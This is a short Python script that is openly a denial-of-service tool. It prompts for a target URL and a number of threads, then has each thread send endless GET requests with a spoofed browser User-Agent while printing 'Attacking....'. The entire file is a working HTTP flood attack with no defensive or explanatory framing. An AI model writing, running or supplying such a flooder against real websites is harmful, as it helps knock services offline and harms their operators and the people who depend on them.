#! /bin/python3

import threading
import requests


def dos(name, url):
    while True:
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'}
            r = requests.get(url, headers=headers)
            print(f"Thread Id: {name} : {r.status_code} Attacking....")
        except:  
            print(f"{name} : Error")


if __name__ == "__main__":
    url = input("Enter URL: ")
    threads = int(input("Enter Number of Threads: "))
    for i in range(threads):
        t = threading.Thread(target=dos, args=(i, url))
        t.start()
